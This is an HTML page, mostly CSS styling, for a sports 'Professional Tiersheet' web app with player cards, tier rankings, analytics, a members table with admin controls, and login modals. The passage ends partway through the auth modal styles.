<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>PHM — Professional Tiersheet</title>
<link href="https://fonts.googleapis.com/css2?family=Barlow+Condensed:wght@400;500;600;700;800;900&family=Barlow:wght@300;400;500;600&family=Orbitron:wght@700;900&display=swap" rel="stylesheet">
<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
<style>
:root{
  --bg:#050810;--bg1:#080d18;--bg2:#0c1220;--bg3:#111928;
  --card:#0f1828;--card2:#141f32;
  --blue:#1e6fff;--blue2:#1458cc;--blue3:#4d8fff;
  --blueglow:rgba(30,111,255,.35);--bluesoft:rgba(30,111,255,.12);
  --white:#f0f4ff;--gray:#7a8aaa;--gray2:#3d4d6a;
  --border:rgba(30,111,255,.18);--border2:rgba(255,255,255,.06);
  --gold:#f5a623;--silver:#9bb0c9;
  --green:#10b981;--red:#ef4444;
}
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
html{-webkit-text-size-adjust:100%;}
body{font-family:'Barlow',sans-serif;background:var(--bg);color:var(--white);min-height:100vh;overflow-x:hidden;}

/* ── SCREENS ── */
.screen{display:none;}
.screen.active{display:flex;}

/* ── SPLASH ── */
#splash{position:fixed;inset:0;flex-direction:column;align-items:center;justify-content:center;background:var(--bg);z-index:200;}
.sbg{display:none;}
.sbg::after{display:none;}
.sc{position:relative;text-align:center;animation:fup 1s ease;padding:0 24px;}
@keyframes fup{from{opacity:0;transform:translateY(24px)}to{opacity:1;transform:translateY(0)}}

/* Splash logo — circle with spinning ring */
.splash-logo-wrap{position:relative;width:180px;height:180px;margin:0 auto 36px;display:flex;align-items:center;justify-content:center;}
.splash-logo-ring{display:none;}
.splash-logo-ring2{display:none;}
.splash-logo-glow{display:none;}
@keyframes spinring{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}
@keyframes glowpulse{0%,100%{opacity:.5;transform:scale(1);}50%{opacity:1;transform:scale(1.08);}}
.splash-logo{width:180px;height:180px;border-radius:0;overflow:visible;border:none;box-shadow:none;background:transparent;}
.splash-logo img{width:100%;height:100%;object-fit:contain;display:block;}

.stitle{font-family:'Orbitron',monospace;font-size:clamp(42px,10vw,80px);font-weight:900;color:var(--white);letter-spacing:8px;line-height:1;text-shadow:0 0 50px rgba(30,111,255,.5);margin-bottom:10px;}
.ssub{font-family:'Barlow Condensed',sans-serif;font-size:clamp(11px,3vw,15px);font-weight:600;letter-spacing:6px;color:var(--gray);text-transform:uppercase;margin-bottom:52px;}
.btn-enter{font-family:'Barlow Condensed',sans-serif;font-size:14px;font-weight:700;letter-spacing:5px;text-transform:uppercase;background:var(--blue);color:var(--white);border:none;padding:17px 64px;border-radius:60px;cursor:pointer;transition:all .3s;box-shadow:0 0 30px var(--blueglow);}
.btn-enter:hover,.btn-enter:active{background:var(--blue3);box-shadow:0 0 55px rgba(77,143,255,.6);transform:translateY(-2px);}

/* ── LOADING — fully redesigned ── */
#loading{position:fixed;inset:0;flex-direction:column;align-items:center;justify-content:center;background:var(--bg);z-index:199;}
#loading .sbg{filter:brightness(.06)saturate(.15);}
.load-inner{position:relative;display:flex;flex-direction:column;align-items:center;text-align:center;}

/* Loading logo circle */
.load-logo-wrap{position:relative;width:120px;height:120px;margin:0 auto 32px;display:flex;align-items:center;justify-content:center;}
.load-ring{display:none;}
.load-ring2{display:none;}
.load-glow{display:none;}
.load-logo{width:120px;height:120px;border-radius:0;overflow:visible;border:none;box-shadow:none;background:transparent;}
.load-logo img{width:100%;height:100%;object-fit:contain;display:block;}

/* Loading text + bar */
.load-title{font-family:'Orbitron',monospace;font-size:clamp(18px,4vw,26px);font-weight:900;letter-spacing:6px;color:var(--white);margin-bottom:6px;text-shadow:0 0 20px rgba(30,111,255,.4);}
.load-sub{font-family:'Barlow Condensed',sans-serif;font-size:11px;font-weight:600;letter-spacing:4px;color:var(--gray);text-transform:uppercase;margin-bottom:28px;}
.ltrack{width:200px;height:3px;background:rgba(255,255,255,.06);border-radius:3px;overflow:hidden;position:relative;}
.ltrack::before{content:'';position:absolute;inset:0;background:linear-gradient(90deg,transparent,rgba(77,143,255,.08),transparent);animation:shimmer 1.5s ease-in-out infinite;}
@keyframes shimmer{0%{transform:translateX(-100%)}100%{transform:translateX(100%)}}
.lfill{height:100%;width:0%;border-radius:3px;background:linear-gradient(90deg,var(--blue),var(--blue3));box-shadow:0 0 8px rgba(30,111,255,.6);transition:width .1s linear;}
.load-pct{font-family:'Orbitron',monospace;font-size:10px;font-weight:700;color:var(--blue3);letter-spacing:2px;margin-top:10px;opacity:.7;}

/* ── NAV LOGO — no circle border ── */
.nav-logo{width:38px;height:38px;flex-shrink:0;border-radius:0;overflow:visible;border:none;box-shadow:none;background:transparent;}
.nav-logo img{width:100%;height:100%;object-fit:contain;display:block;}

/* ── AUTH LOGO — no circle border ── */
.auth-logo{width:84px;height:84px;margin:0 auto 14px;border-radius:0;overflow:visible;border:none;box-shadow:none;background:transparent;}
.auth-logo img{width:100%;height:100%;object-fit:contain;display:block;}

/* ── APP ── */
#app{flex-direction:column;min-height:100vh;}

/* ── NAV ── */
.nav{height:60px;background:linear-gradient(90deg,var(--bg1),var(--bg2));border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;padding:0 20px;position:sticky;top:0;z-index:60;backdrop-filter:blur(20px);gap:8px;}
.nbrand{display:flex;align-items:center;gap:10px;flex-shrink:0;}
.nbrand-txt{display:flex;flex-direction:column;}
.nbrand-txt h1{font-family:'Barlow Condensed',sans-serif;font-size:clamp(11px,2vw,16px);font-weight:800;letter-spacing:3px;color:var(--white);white-space:nowrap;}
.nbrand-txt p{font-size:9px;color:var(--gray);letter-spacing:2px;text-transform:uppercase;}
@media(max-width:580px){.nbrand-txt p{display:none;}}
.ntabs{display:flex;gap:2px;}
.ntab{font-family:'Barlow Condensed',sans-serif;font-size:12px;font-weight:700;letter-spacing:2px;text-transform:uppercase;background:none;border:none;color:var(--gray);padding:7px 12px;border-radius:6px;cursor:pointer;transition:all .2s;white-space:nowrap;}
.ntab:hover{color:var(--white);background:var(--bluesoft);}
.ntab.on{color:var(--blue3);background:var(--bluesoft);}
.nright{display:flex;align-items:center;gap:7px;flex-shrink:0;}

/* ── USER PILL ── */
.upill{display:flex;align-items:center;gap:7px;padding:5px 11px 5px 5px;background:var(--card);border:1px solid var(--border);border-radius:50px;cursor:pointer;transition:all .2s;position:relative;max-width:210px;}
.upill:hover{border-color:var(--blue3);}
.uava{width:27px;height:27px;border-radius:50%;background:var(--blue2);border:2px solid var(--blue3);display:flex;align-items:center;justify-content:center;font-family:'Barlow Condensed',sans-serif;font-size:12px;font-weight:800;flex-shrink:0;overflow:hidden;}
.uava img{width:100%;height:100%;object-fit:cover;}
.uname{font-family:'Barlow Condensed',sans-serif;font-size:12px;font-weight:700;letter-spacing:1px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:75px;}
.rbadge{font-family:'Barlow Condensed',sans-serif;font-size:9px;font-weight:700;letter-spacing:1.5px;padding:2px 7px;border-radius:20px;text-transform:uppercase;flex-shrink:0;}
.rfan{background:rgba(59,130,246,.18);color:#60a5fa;border:1px solid rgba(59,130,246,.3);}
.rplayer{background:rgba(16,185,129,.18);color:#34d399;border:1px solid rgba(16,185,129,.3);}
.radmin{background:rgba(245,158,11,.18);color:#fbbf24;border:1px solid rgba(245,158,11,.3);}
.shield{font-size:13px;filter:drop-shadow(0 0 5px rgba(245,158,11,.8));flex-shrink:0;}
.dd{position:absolute;top:calc(100% + 8px);right:0;background:var(--card2);border:1px solid var(--border);border-radius:12px;min-width:175px;overflow:hidden;display:none;z-index:200;box-shadow:0 20px 50px rgba(0,0,0,.5);}
.dd.open{display:block;}
.ddi{font-family:'Barlow Condensed',sans-serif;font-size:13px;font-weight:600;letter-spacing:1px;padding:12px 16px;cursor:pointer;color:var(--gray);display:flex;align-items:center;gap:8px;transition:all .2s;border-bottom:1px solid var(--border2);}
.ddi:last-child{border-bottom:none;}
.ddi svg{width:14px;height:14px;stroke:currentColor;fill:none;stroke-width:2;flex-shrink:0;}
.ddi:hover{color:var(--white);background:var(--bluesoft);}
.ddi.red:hover{color:#f87171;background:rgba(239,68,68,.1);}
.bsmall{font-family:'Barlow Condensed',sans-serif;font-size:11px;font-weight:700;letter-spacing:2px;text-transform:uppercase;padding:7px 15px;border-radius:8px;cursor:pointer;transition:all .2s;border:none;white-space:nowrap;}
.boutline{background:none;color:var(--gray);border:1px solid var(--border2)!important;}
.boutline:hover,.boutline:active{color:var(--white);border-color:var(--blue3)!important;}
.bprimary{background:var(--blue);color:var(--white);box-shadow:0 0 14px var(--blueglow);}
.bprimary:hover,.bprimary:active{background:var(--blue3);}

/* ── PAGES ── */
.page{display:none;flex:1;}
.page.on{display:block;}

/* ── PAGE HERO HEADER ── */
.page-hero{background:linear-gradient(135deg,var(--bg1),var(--bg));border-bottom:1px solid var(--border2);padding:24px 20px 20px;position:relative;overflow:hidden;}
.page-hero::before{content:'';position:absolute;top:-40px;right:-40px;width:200px;height:200px;background:radial-gradient(circle,rgba(30,111,255,.08),transparent 70%);pointer-events:none;}
.page-hero-top{display:flex;align-items:flex-start;justify-content:space-between;gap:12px;flex-wrap:wrap;}
.page-hero h2{font-family:'Barlow Condensed',sans-serif;font-size:clamp(17px,4vw,23px);font-weight:900;letter-spacing:4px;text-transform:uppercase;margin-bottom:3px;}
.page-hero p{font-size:11px;color:var(--gray);letter-spacing:2px;text-transform:uppercase;}
.hero-badge{font-family:'Barlow Condensed',sans-serif;font-size:9px;font-weight:800;letter-spacing:2px;text-transform:uppercase;padding:4px 10px;border-radius:20px;background:var(--bluesoft);color:var(--blue3);border:1px solid var(--border);white-space:nowrap;align-self:flex-start;}

/* ── STATS ROW ── */
.srow{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;padding:16px 20px;}
@media(max-width:500px){.srow{grid-template-columns:repeat(2,1fr);}}
.sbox{background:var(--card);border:1px solid var(--border2);border-radius:12px;padding:14px 12px;text-align:center;transition:all .3s;position:relative;overflow:hidden;cursor:default;}
.sbox::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,transparent,var(--blue3),transparent);opacity:0;transition:.3s;}
.sbox:hover::before{opacity:1;}
.sbox:hover{border-color:var(--border);transform:translateY(-1px);}
.sn{font-family:'Orbitron',monospace;font-size:clamp(20px,5vw,32px);font-weight:900;color:var(--blue3);line-height:1;margin-bottom:5px;}
.sl{font-family:'Barlow Condensed',sans-serif;font-size:9px;font-weight:700;letter-spacing:3px;color:var(--gray);text-transform:uppercase;}
.sbox-icon{position:absolute;top:10px;right:10px;opacity:.12;}
.sbox-icon svg{width:22px;height:22px;stroke:var(--blue3);fill:none;stroke-width:1.5;}

/* ── CONTROLS ── */
.ctrls{display:flex;align-items:center;gap:8px;padding:0 20px 14px;flex-wrap:wrap;}
.swrap{position:relative;flex:1;min-width:140px;}
.swrap input{width:100%;background:var(--card);border:1px solid var(--border2);border-radius:9px;padding:9px 12px 9px 36px;color:var(--white);font-family:'Barlow',sans-serif;font-size:13px;outline:none;transition:all .2s;}
.swrap input:focus{border-color:var(--blue3);background:var(--card2);}
.swrap input::placeholder{color:var(--gray2);}
.sico{position:absolute;left:11px;top:50%;transform:translateY(-50%);color:var(--gray2);pointer-events:none;line-height:1;display:flex;}
.sico svg{width:13px;height:13px;stroke:currentColor;fill:none;stroke-width:2.5;}
.fsel{background:var(--card);border:1px solid var(--border2);border-radius:9px;padding:9px 28px 9px 11px;color:var(--white);font-family:'Barlow Condensed',sans-serif;font-size:12px;font-weight:600;letter-spacing:1px;outline:none;cursor:pointer;appearance:none;background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='11' height='11' viewBox='0 0 24 24' fill='none' stroke='%237a8aaa' stroke-width='2'%3E%3Cpath d='M6 9l6 6 6-6'/%3E%3C/svg%3E");background-repeat:no-repeat;background-position:right 9px center;transition:all .2s;}
.fsel:focus{border-color:var(--blue3);}
.brefresh{font-family:'Barlow Condensed',sans-serif;font-size:11px;font-weight:700;letter-spacing:2px;text-transform:uppercase;background:var(--card);color:var(--blue3);border:1px solid var(--blue2);padding:9px 15px;border-radius:9px;cursor:pointer;transition:all .2s;display:flex;align-items:center;gap:5px;white-space:nowrap;}
.brefresh:hover,.brefresh:active{background:var(--bluesoft);}

/* ── TIER GRID ── */
.twrap{padding:0 20px 48px;}
.tsec{margin-bottom:30px;}
.thead{display:flex;align-items:center;gap:12px;margin-bottom:12px;}
.tpill{font-family:'Barlow Condensed',sans-serif;font-size:10px;font-weight:800;letter-spacing:2.5px;padding:4px 13px;border-radius:40px;text-transform:uppercase;}
.t1p{background:rgba(30,111,255,.18);color:#60a5fa;border:1px solid rgba(30,111,255,.3);}
.t2p{background:rgba(124,58,237,.18);color:#a78bfa;border:1px solid rgba(124,58,237,.3);}
.t3p{background:rgba(16,185,129,.18);color:#34d399;border:1px solid rgba(16,185,129,.3);}
.t4p{background:rgba(245,158,11,.18);color:#fbbf24;border:1px solid rgba(245,158,11,.3);}
.t1c{color:#60a5fa;}.t2c{color:#a78bfa;}.t3c{color:#34d399;}.t4c{color:#fbbf24;}
.tcnt{font-size:11px;color:var(--gray);font-family:'Barlow Condensed',sans-serif;letter-spacing:1px;}
.tdiv{flex:1;height:1px;background:var(--border2);}
.pgrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(155px,1fr));gap:12px;}
@media(max-width:380px){.pgrid{grid-template-columns:repeat(2,1fr);gap:8px;}}

/* ── PLAYER CARD ── */
/* CRITICAL FIX: pointer-events none on ::before so touch events reach the card */
.pc{background:var(--card);border:1px solid var(--border2);border-radius:16px;padding:20px 14px 14px;text-align:center;cursor:pointer;transition:all .3s;position:relative;overflow:hidden;-webkit-user-select:none;user-select:none;}
.pc::before{content:'';position:absolute;inset:0;background:radial-gradient(ellipse at top,var(--bluesoft),transparent 65%);opacity:0;transition:.3s;pointer-events:none;}
.pc:hover::before,.pc:active::before{opacity:1;}
.pc:hover,.pc:active{border-color:var(--blue);transform:translateY(-2px);box-shadow:0 12px 36px rgba(30,111,255,.18);}
.pc-nat{position:absolute;top:8px;right:8px;font-size:8px;font-family:'Barlow Condensed',sans-serif;font-weight:800;letter-spacing:1px;color:var(--gray);background:var(--bg3);padding:2px 5px;border-radius:3px;pointer-events:none;}
.pc-ava{width:60px;height:60px;border-radius:50%;margin:0 auto 10px;background:var(--bg3);border:2px solid var(--border2);display:flex;align-items:center;justify-content:center;overflow:hidden;transition:.3s;pointer-events:none;}
.pc:hover .pc-ava,.pc:active .pc-ava{border-color:var(--blue3);}
.pc-ava img{width:100%;height:100%;object-fit:cover;}
.pc-name{font-family:'Barlow Condensed',sans-serif;font-size:14px;font-weight:800;letter-spacing:.5px;color:var(--white);margin-bottom:3px;pointer-events:none;}
.pc-tier{font-family:'Barlow Condensed',sans-serif;font-size:9px;font-weight:700;letter-spacing:2px;text-transform:uppercase;margin-bottom:8px;pointer-events:none;}
.pc-rat{font-family:'Orbitron',monospace;font-size:28px;font-weight:900;color:var(--blue3);line-height:1;margin-bottom:3px;pointer-events:none;}
.pc-val{font-size:10px;color:var(--gray);letter-spacing:.5px;margin-bottom:10px;pointer-events:none;}
.pc-pos{font-family:'Barlow Condensed',sans-serif;font-size:9px;font-weight:800;letter-spacing:2px;text-transform:uppercase;color:var(--blue3);background:var(--bluesoft);border:1px solid var(--border);border-radius:20px;padding:2px 8px;display:inline-block;margin-bottom:5px;pointer-events:none;}
/* CRITICAL FIX: admin edit button always visible, larger touch target on mobile */
.pc-edit-btn{display:none;font-family:'Barlow Condensed',sans-serif;font-size:9px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;padding:7px 14px;border-radius:8px;border:none;cursor:pointer;background:rgba(30,111,255,.2);color:var(--blue3);border:1px solid rgba(30,111,255,.35);width:100%;transition:all .2s;position:relative;z-index:2;touch-action:manipulation;min-height:34px;}
.pc-edit-btn:hover,.pc-edit-btn:active{background:var(--blue);color:#fff;border-color:var(--blue);}
.pc-edit-btn.vis{display:block;}

/* ── FAN BANNER ── */
.fan-banner{margin:14px 20px 4px;background:linear-gradient(135deg,rgba(30,111,255,.07),rgba(30,111,255,.02));border:1px solid var(--border);border-radius:14px;padding:18px 20px;display:flex;align-items:center;gap:14px;flex-wrap:wrap;}
.fan-banner-ico{width:42px;height:42px;border-radius:50%;background:var(--bluesoft);border:2px solid var(--border);display:flex;align-items:center;justify-content:center;flex-shrink:0;}
.fan-banner-ico svg{width:20px;height:20px;stroke:var(--blue3);fill:none;stroke-width:2;}
.fan-banner-txt h3{font-family:'Barlow Condensed',sans-serif;font-size:14px;font-weight:800;letter-spacing:2px;color:var(--white);margin-bottom:3px;}
.fan-banner-txt p{font-size:11px;color:var(--gray);line-height:1.5;}
.fan-banner-txt{flex:1;min-width:130px;}

/* ── ANALYTICS ── */
.awrap{padding:20px;}
.asec-title{font-family:'Barlow Condensed',sans-serif;font-size:11px;font-weight:800;letter-spacing:4px;color:var(--blue3);text-transform:uppercase;margin-bottom:18px;}
.agrid{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-bottom:20px;}
@media(max-width:580px){.agrid{grid-template-columns:1fr;}}
.acard{background:var(--card);border:1px solid var(--border2);border-radius:14px;padding:18px;}
.act{font-family:'Barlow Condensed',sans-serif;font-size:9px;font-weight:700;letter-spacing:3px;color:var(--gray);text-transform:uppercase;margin-bottom:14px;}
.nbars{display:flex;align-items:flex-end;gap:8px;height:110px;padding-top:18px;}
.nbw{display:flex;flex-direction:column;align-items:center;gap:5px;flex:1;}
.nb{width:100%;border-radius:3px 3px 0 0;background:linear-gradient(180deg,var(--blue3),var(--blue2));min-height:3px;position:relative;}
.nbnum{font-family:'Orbitron',monospace;font-size:8px;color:var(--blue3);position:absolute;top:-16px;left:50%;transform:translateX(-50%);white-space:nowrap;}
.nblbl{font-family:'Barlow Condensed',sans-serif;font-size:10px;color:var(--gray);letter-spacing:1px;}
.stabs{display:flex;margin-bottom:12px;border-bottom:1px solid var(--border2);}
.stab{font-family:'Barlow Condensed',sans-serif;font-size:10px;font-weight:700;letter-spacing:2px;text-transform:uppercase;background:none;border:none;color:var(--gray);padding:6px 14px 10px;cursor:pointer;border-bottom:2px solid transparent;margin-bottom:-1px;transition:all .2s;}
.stab.on{color:var(--blue3);border-bottom-color:var(--blue3);}
.slist{list-style:none;}
.srow2{display:flex;align-items:center;gap:9px;padding:7px 0;border-bottom:1px solid var(--border2);}
.srow2:last-child{border-bottom:none;}
.srnk{font-family:'Orbitron',monospace;font-size:9px;color:var(--gray2);width:15px;text-align:center;flex-shrink:0;}
.srnk.g{color:var(--gold);}.srnk.s{color:var(--silver);}.srnk.b{color:#a07c50;}
.sava{width:29px;height:29px;border-radius:50%;background:var(--bg3);border:2px solid var(--border2);overflow:hidden;display:flex;align-items:center;justify-content:center;flex-shrink:0;}
.sava img{width:100%;height:100%;object-fit:cover;}
.snm{font-family:'Barlow Condensed',sans-serif;font-size:13px;font-weight:700;flex:1;}
.sv{font-family:'Orbitron',monospace;font-size:12px;font-weight:700;color:var(--blue3);}
.mvps{margin-top:20px;}
.mvph{display:flex;align-items:center;gap:8px;margin-bottom:12px;}
.mvpb{width:3px;height:16px;background:var(--blue);border-radius:2px;}
.mvph h3{font-family:'Barlow Condensed',sans-serif;font-size:11px;font-weight:700;letter-spacing:3px;text-transform:uppercase;color:var(--white);}
.mvpr{display:flex;gap:10px;overflow-x:auto;padding-bottom:6px;-webkit-overflow-scrolling:touch;scrollbar-width:none;}
.mvpr::-webkit-scrollbar{display:none;}
.mvpc{background:var(--card);border:1px solid var(--border2);border-radius:13px;padding:14px 12px;text-align:center;flex-shrink:0;width:135px;cursor:pointer;transition:all .3s;}
.mvpc:hover,.mvpc:active{border-color:var(--blue);transform:translateY(-2px);}
.mvpava{width:46px;height:46px;border-radius:50%;margin:0 auto 8px;background:var(--bg3);border:2px solid var(--border);overflow:hidden;display:flex;align-items:center;justify-content:center;}
.mvpava img{width:100%;height:100%;object-fit:cover;}
.mvpnm{font-family:'Barlow Condensed',sans-serif;font-size:13px;font-weight:800;margin-bottom:2px;}
.mvptier{font-family:'Barlow Condensed',sans-serif;font-size:8px;font-weight:700;letter-spacing:2px;text-transform:uppercase;margin-bottom:5px;}
.mvpval{font-size:10px;color:var(--gray);}

/* ── RECENT ACTIVITY ── */
.activity-wrap{margin-top:20px;}
.activity-list{background:var(--card);border:1px solid var(--border2);border-radius:14px;overflow:hidden;}
.act-row{display:flex;align-items:center;gap:12px;padding:12px 16px;border-bottom:1px solid var(--border2);transition:background .2s;}
.act-row:last-child{border-bottom:none;}
.act-row:hover{background:var(--bg3);}
.act-dot{width:7px;height:7px;border-radius:50%;flex-shrink:0;}
.act-txt{font-family:'Barlow Condensed',sans-serif;font-size:13px;font-weight:600;flex:1;}
.act-time{font-size:10px;color:var(--gray);flex-shrink:0;}

/* ── MEMBERS TABLE ── */
.mwrap{padding:20px;}
.mtitle{font-family:'Barlow Condensed',sans-serif;font-size:11px;font-weight:800;letter-spacing:4px;color:var(--blue3);text-transform:uppercase;margin-bottom:18px;}
.mtable{background:var(--card);border:1px solid var(--border2);border-radius:14px;overflow:hidden;}
.mth{background:var(--bg3);display:grid;grid-template-columns:1.6fr 0.9fr 0.8fr 0.9fr 190px;padding:10px 16px;border-bottom:1px solid var(--border2);}
.mthc{font-family:'Barlow Condensed',sans-serif;font-size:9px;font-weight:700;letter-spacing:2.5px;color:var(--gray);text-transform:uppercase;}
.mrow{display:grid;grid-template-columns:1.6fr 0.9fr 0.8fr 0.9fr 190px;padding:11px 16px;border-bottom:1px solid var(--border2);align-items:center;transition:background .2s;}
.mrow:last-child{border-bottom:none;}
.mrow:hover{background:var(--bg3);}
.mcell{font-family:'Barlow Condensed',sans-serif;font-size:12px;font-weight:600;display:flex;align-items:center;gap:6px;}
.mava{width:26px;height:26px;border-radius:50%;background:var(--blue2);border:2px solid var(--border);display:flex;align-items:center;justify-content:center;font-size:10px;font-weight:800;overflow:hidden;flex-shrink:0;}
.mava img{width:100%;height:100%;object-fit:cover;}
.macts{display:flex;gap:4px;justify-content:flex-end;flex-wrap:wrap;}
/* CRITICAL: All admin buttons need large touch targets */
.abtn{font-family:'Barlow Condensed',sans-serif;font-size:9px;font-weight:700;letter-spacing:1px;text-transform:uppercase;padding:6px 9px;border-radius:6px;border:none;cursor:pointer;transition:all .2s;touch-action:manipulation;white-space:nowrap;min-height:30px;display:inline-flex;align-items:center;justify-content:center;}
.apromote{background:rgba(16,185,129,.18);color:#34d399;border:1px solid rgba(16,185,129,.3);}
.apromote:hover,.apromote:active{background:var(--green);color:#fff;}
.ademote{background:rgba(239,68,68,.1);color:#f87171;border:1px solid rgba(239,68,68,.2);}
.ademote:hover,.ademote:active{background:var(--red);color:#fff;}
.aedit{background:rgba(30,111,255,.18);color:var(--blue3);border:1px solid rgba(30,111,255,.3);}
.aedit:hover,.aedit:active{background:var(--blue);color:#fff;}
.atier{background:rgba(245,158,11,.15);color:#fbbf24;border:1px solid rgba(245,158,11,.25);}
.atier:hover,.atier:active{background:#f59e0b;color:#000;}
.adelete{background:rgba(239,68,68,.08);color:#f87171;border:1px solid rgba(239,68,68,.15);}
.adelete:hover,.adelete:active{background:var(--red);color:#fff;}
@media(max-width:720px){
  .mth{grid-template-columns:1.4fr 0.9fr 160px;}
  .mrow{grid-template-columns:1.4fr 0.9fr 160px;}
  .mthc:nth-child(3),.mcell:nth-child(3),
  .mthc:nth-child(4),.mcell:nth-child(4){display:none;}
}
@media(max-width:460px){
  .mth{grid-template-columns:1fr 130px;}
  .mrow{grid-template-columns:1fr 130px;}
  .mthc:nth-child(2),.mcell:nth-child(2){display:none;}
  .abtn{font-size:8px;padding:5px 6px;}
}

/* ── MODALS (shared) ── */
.ov{position:fixed;inset:0;background:rgba(0,0,0,.85);backdrop-filter:blur(12px);z-index:300;display:none;align-items:flex-start;justify-content:center;padding:20px;overflow-y:auto;}
.ov.open{display:flex;}
@keyframes mi{from{opacity:0;transform:scale(.96)translateY(10px)}to{opacity:1;transform:scale(1)translateY(0)}}

/* Heatmap modal */
.hmod{background:var(--bg2);border:1px solid var(--border);border-radius:20px;display:flex;width:100%;max-width:620px;overflow:hidden;box-shadow:0 40px 80px rgba(0,0,0,.6);animation:mi .3s ease;margin:auto;}
.hmleft{width:190px;background:var(--card);border-right:1px solid var(--border);padding:26px 18px;display:flex;flex-direction:column;align-items:center;justify-content:center;flex-shrink:0;gap:0;}
.hmava{width:76px;height:76px;border-radius:50%;background:var(--bg3);border:3px solid var(--blue);margin-bottom:12px;overflow:hidden;display:flex;align-items:center;justify-content:center;box-shadow:0 0 22px var(--blueglow);}
.hmava img{width:100%;height:100%;object-fit:cover;}
.hmname{font-family:'Barlow Condensed',sans-serif;font-size:19px;font-weight:900;text-align:center;margin-bottom:2px;}
.hmtier{font-family:'Barlow Condensed',sans-serif;font-size:9px;font-weight:700;letter-spacing:2px;text-transform:uppercase;margin-bottom:10px;}
.hmrat{font-family:'Orbitron',monospace;font-size:44px;font-weight:900;color:var(--blue3);line-height:1;margin-bottom:5px;text-shadow:0 0 18px var(--blueglow);}
.hmval{font-size:11px;color:var(--gray);margin-bottom:8px;}
.hmpos{font-family:'Barlow Condensed',sans-serif;font-size:10px;font-weight:700;letter-spacing:2px;text-transform:uppercase;color:var(--blue3);background:var(--bluesoft);border:1px solid var(--border);border-radius:20px;padding:2px 10px;display:inline-block;margin-bottom:8px;}
.hmbio{font-size:11px;color:var(--gray);line-height:1.5;text-align:center;padding:8px 6px 0;border-top:1px solid var(--border2);margin-top:6px;font-style:italic;}
.hmright{flex:1;padding:22px 20px;min-width:0;}
.hmhead{display:flex;justify-content:space-between;align-items:center;margin-bottom:18px;}
.hmtitle{font-family:'Orbitron',monospace;font-size:10px;font-weight:700;letter-spacing:3px;}
.cbtn{width:28px;height:28px;background:var(--bg3);border:1px solid var(--border2);border-radius:50%;display:flex;align-items:center;justify-content:center;cursor:pointer;color:var(--gray);font-size:13px;transition:all .2s;flex-shrink:0;touch-action:manipulation;}
.cbtn:hover,.cbtn:active{background:rgba(239,68,68,.15);color:#ef4444;border-color:#ef4444;}
.hrow{display:flex;align-items:center;gap:10px;margin-bottom:12px;}
.hlbl{font-family:'Barlow Condensed',sans-serif;font-size:9px;font-weight:700;letter-spacing:2px;color:var(--gray);text-transform:uppercase;width:68px;flex-shrink:0;}
.htrack{flex:1;height:6px;background:var(--bg3);border-radius:3px;overflow:hidden;}
.hfill{height:100%;border-radius:3px;background:linear-gradient(90deg,var(--blue),var(--blue3));box-shadow:0 0 5px var(--blueglow);transition:width 1s ease;}
.hv{font-family:'Orbitron',monospace;font-size:11px;font-weight:700;color:var(--blue3);width:24px;text-align:right;flex-shrink:0;}
@media(max-width:540px){
  .hmod{flex-direction:column;}
  .hmleft{width:100%;border-right:none;border-bottom:1px solid var(--border);padding:18px;flex-direction:row;gap:14px;justify-content:flex-start;}
  .hmava{margin:0;flex-shrink:0;}
  .hmrat{font-size:32px;}
}

/* Shared modal styles */
.std-mod{background:var(--bg2);border:1px solid var(--border);border-radius:20px;padding:24px;width:100%;max-width:480px;max-height:88vh;overflow-y:auto;animation:mi .3s ease;-webkit-overflow-scrolling:touch;margin:auto;}
.mod-title{font-family:'Barlow Condensed',sans-serif;font-size:16px;font-weight:900;letter-spacing:2px;display:flex;justify-content:space-between;align-items:center;margin-bottom:18px;}
.fgrid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:10px;}
@media(max-width:360px){.fgrid{grid-template-columns:1fr;}}
.fg{display:flex;flex-direction:column;gap:4px;}
.fg.full{grid-column:1/-1;}
.flbl{font-family:'Barlow Condensed',sans-serif;font-size:9px;font-weight:700;letter-spacing:2px;color:var(--gray);text-transform:uppercase;}
.finp{background:var(--card);border:1px solid var(--border2);border-radius:8px;padding:9px 11px;color:var(--white);font-family:'Barlow',sans-serif;font-size:13px;outline:none;transition:all .2s;width:100%;}
.finp:focus{border-color:var(--blue3);background:var(--card2);}
.rrow{display:flex;align-items:center;gap:10px;}
.rrow input[type=range]{flex:1;accent-color:var(--blue3);height:20px;cursor:pointer;}
.rv{font-family:'Orbitron',monospace;font-size:10px;color:var(--blue3);width:22px;text-align:right;}
.mod-acts{display:flex;gap:8px;margin-top:18px;justify-content:flex-end;flex-wrap:wrap;}
.mod-acts button,.facts button{font-family:'Barlow Condensed',sans-serif;font-size:11px;font-weight:700;letter-spacing:2px;text-transform:uppercase;padding:9px 18px;border-radius:8px;cursor:pointer;transition:all .2s;touch-action:manipulation;min-height:38px;}
.fcancel{background:none;border:1px solid var(--border2);color:var(--gray);}
.fcancel:hover,.fcancel:active{color:var(--white);border-color:var(--blue3);}
.fsave{background:var(--blue);color:#fff;border:none;box-shadow:0 0 14px var(--blueglow);}
.fsave:hover,.fsave:active{background:var(--blue3);}
.stats-label{font-family:'Barlow Condensed',sans-serif;font-size:9px;letter-spacing:2px;color:var(--gray);text-transform:uppercase;margin-bottom:10px;margin-top:6px;}

/* ── AUTH MODAL ── */
.amod{background:var(--bg2);border:1px solid var(--border);border-radius:20px;padding:30px;width:100%;max-width:370px;animation:mi .3s ease;margin:auto;}
.acrest{text-align:center;margin-bottom:20px;}
.auth-logo{width:80px;height:80px;margin:0 auto 12px;border-radius:18px;overflow:hidden;}
.atitl{font-family:'Orbitron',monospace;font-size:14px;font-weight:700;letter-spacing:2px;text-align:center;margin-bottom:4px;}
